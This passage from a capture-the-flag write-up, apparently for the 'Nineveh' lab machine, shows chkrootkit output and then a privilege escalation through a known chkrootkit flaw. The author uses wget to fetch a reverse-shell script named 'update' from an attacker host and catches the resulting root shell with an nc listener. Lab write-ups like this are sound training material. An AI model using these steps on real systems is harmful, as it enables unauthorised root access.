Searching for LOC rootkit... nothing found
Searching for Romanian rootkit... nothing found
Searching for Suckit rootkit... Warning: /sbin/init INFECTED
Searching for Volc rootkit... nothing found
Searching for Gold2 rootkit... nothing found
Searching for TC2 Worm default files and dirs... nothing found
Searching for Anonoying rootkit default files and dirs... nothing found
Searching for ZK rootkit default files and dirs... nothing found
Searching for ShKit rootkit default files and dirs... nothing found
Searching for AjaKit rootkit default files and dirs... nothing found
Searching for zaRwT rootkit default files and dirs... nothing found
Searching for Madalin rootkit default files... nothing found
Searching for Fu rootkit default files... nothing found
Searching for ESRK rootkit default files... nothing found
Searching for rootedoor... nothing found
Searching for ENYELKM rootkit default files... nothing found
Searching for common ssh-scanners default files... nothing found
```
From this output, I take a string that I think might be unique: "Searching for suspicious files and dirs, it may take a while...", and google it. The results I get back are all to do with the chkrootkit application. I can verify that it exists, but I can't run it as I am not root.
```bash
amrois@nineveh:/report$ which chkrootkit
/usr/bin/chkrootkit

amrois@nineveh:/report$ chkrootkit -V
/bin/sh: 0: Can't open /usr/bin/chkrootkit

amrois@nineveh:/report$ ls -l /usr/bin/chkrootkit
-rwx--x--x 1 root root 76181 Jul  2  2017 /usr/bin/chkrootkit
```
From previous experince doing a vulnhub machine (SickOS) I know there is a vulnerable version of chkrootkit that allows for RCE and privilege escalation. Without the version number there's no garuntee it will work, but yolo, there is no downside to attempting it.

### 9. Escalate to root
Create bash reverse shell script, then wget it to the machine and give it execute perms.
```bash
amrois@nineveh:/tmp$ wget http://10.10.14.162:8000/update && chmod +x update && echo "Done"
<ttp://10.10.14.162:8000/update && chmod +x update && echo "Done"            
--2020-12-18 06:24:28--  http://10.10.14.162:8000/update
Connecting to 10.10.14.162:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 55 [application/octet-stream]
Saving to: ‘update’

update              100%[===================>]      55  --.-KB/s    in 0s      

2020-12-18 06:24:28 (14.4 MB/s) - ‘update’ saved [55/55]

Done
```
Wait a minute...
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9998
listening on [any] 9998 ...
connect to [10.10.14.162] from (UNKNOWN) [10.129.64.187] 56706
bash: cannot set terminal process group (25029): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# whoami
whoami
root
```